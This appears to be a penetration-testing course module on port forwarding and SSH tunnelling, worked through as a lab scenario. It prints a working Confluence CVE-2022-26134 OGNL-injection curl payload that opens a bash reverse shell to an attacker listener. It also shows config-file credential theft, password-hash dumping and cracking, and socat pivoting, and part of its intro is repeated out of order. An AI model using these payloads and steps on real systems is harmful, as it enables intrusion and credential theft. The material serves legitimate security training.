Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

